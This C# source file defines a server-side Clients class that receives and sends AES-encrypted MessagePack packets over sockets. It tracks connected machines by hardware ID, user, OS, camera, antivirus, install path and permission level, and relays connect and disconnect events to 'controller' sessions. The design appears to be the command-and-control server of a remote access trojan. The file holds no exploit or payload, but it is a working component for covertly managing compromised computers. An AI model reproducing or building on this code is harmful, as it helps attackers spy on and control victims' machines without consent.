using System;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using MessagePack;

namespace Server
{
    public class Clients
    {
        public Socket ClientSocket { get; set; }
        public string ID { get; set; }
        private byte[] ClientBuffer { get; set; }
        private int ClientBuffersize { get; set; }
        private bool ClientBufferRecevied { get; set; }
        private MemoryStream ClientMS { get; set; }
        public object SendSync { get; } = new();
        private object EndSendSync { get; } = new();
        public long BytesRecevied { get; set; }
        public ClientInfo Info { get; set; }
        public bool Controler { get; set; }

        public class ClientInfo
        {
            public string HWID;
            public string IP;
            public string User;
            public string OS;
            public string Camera;
            public string InstallTime;
            public string Path;
            public string Active;
            public string Version;
            public string Permission;
            public string AV;
            public string Group;
            public DateTime LastPing;
        }

        public Clients(Socket socket)
        {
            ClientSocket = socket;
            ClientBuffer = new byte[4];
            ClientMS = new MemoryStream();
            Controler = false;
            Info = new ClientInfo
            {
                IP = ClientSocket.RemoteEndPoint.ToString().Split(':')[0]
            };
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, ReadClientData, null);
        }

        public async void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!ClientSocket.Connected)
                {
                    Disconnected();
                    return;
                }

                var Recevied = ClientSocket.EndReceive(ar);
                if (Recevied > 0)
                {
                    if (!ClientBufferRecevied)
                    {
                        await ClientMS.WriteAsync(ClientBuffer, 0, ClientBuffer.Length);
                        ClientBuffersize = BitConverter.ToInt32(ClientMS.ToArray(), 0);
                        await ClientMS.DisposeAsync();
                        ClientMS = new MemoryStream();
                        if (ClientBuffersize > 0)
                        {
                            ClientBuffer = new byte[ClientBuffersize];
                            ClientBufferRecevied = true;
                        }
                    }
                    else
                    {
                        await ClientMS.WriteAsync(ClientBuffer, 0, Recevied);
                        Settings.Received += Recevied;
                        BytesRecevied += Recevied;
                        if (ClientMS.Length == ClientBuffersize)
                        {
                            var handlePacket = new HandlePacket
                            {
                                client = this,
                                data = ClientMS.ToArray()
                            };
                            handlePacket.Read();
                            ClientBuffer = new byte[4];
                            await ClientMS.DisposeAsync();
                            ClientMS = new MemoryStream();
                            ClientBufferRecevied = false;
                        }
                        else
                        {
                            ClientBuffer = new byte[ClientBuffersize - ClientMS.Length];
                        }
                    }

                    ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None,
                        ReadClientData, null);
                }
                else
                {
                    Disconnected();
                }
            }
            catch
            {
                Disconnected();
            }
        }

        public void Disconnected()
        {
            try
            {
                if (Controler)
                {
                    lock (Settings.Controler)
                    {
                        Settings.Controler.Remove(this);
                    }

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "controlerClose";
                    msgpack.ForcePathObject("HWID").AsString = Info.HWID;
                    if (Settings.Online.Count > 0)
                        foreach (var CL in Settings.Online.ToList())
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                }
                else
                {
                    lock (Settings.Online)
                    {
                        Settings.Online.Remove(this);
                    }

                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Packet").AsString = "ClientClose";
                    msgpack.ForcePathObject("HWID").AsString = Info.HWID;
                    if (Settings.Controler.Count > 0)
                        foreach (var CL in Settings.Controler.ToList())
                            ThreadPool.QueueUserWorkItem(CL.BeginSend, msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }

            try
            {
                if (ClientSocket.Connected) ClientSocket.Shutdown(SocketShutdown.Both);
            }
            catch
            {
            }

            try
            {
                ClientSocket?.Dispose();
                ClientMS?.Dispose();
            }
            catch
            {
            }
        }

        public void BeginSend(object msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    if ((byte[]) msg == null) return;

                    var buffer = Helper.Aes.Encrypt((byte[]) msg);
                    var buffersize = BitConverter.GetBytes(buffer.Length);


                    ClientSocket.Poll(-1, SelectMode.SelectWrite);
                    ClientSocket.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
                    ClientSocket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                }
                catch
                {
                    Disconnected();
                }
            }
        }

        private void EndSend(IAsyncResult ar)
        {
            lock (EndSendSync)
            {
                try
                {
                    if (!ClientSocket.Connected)
                    {
                        Disconnected();
                        return;
                    }

                    var sent = 0;
                    sent = ClientSocket.EndSend(ar);
                    Settings.Sent += sent;
                }
                catch
                {
                    Disconnected();
                }
            }
        }
    }
}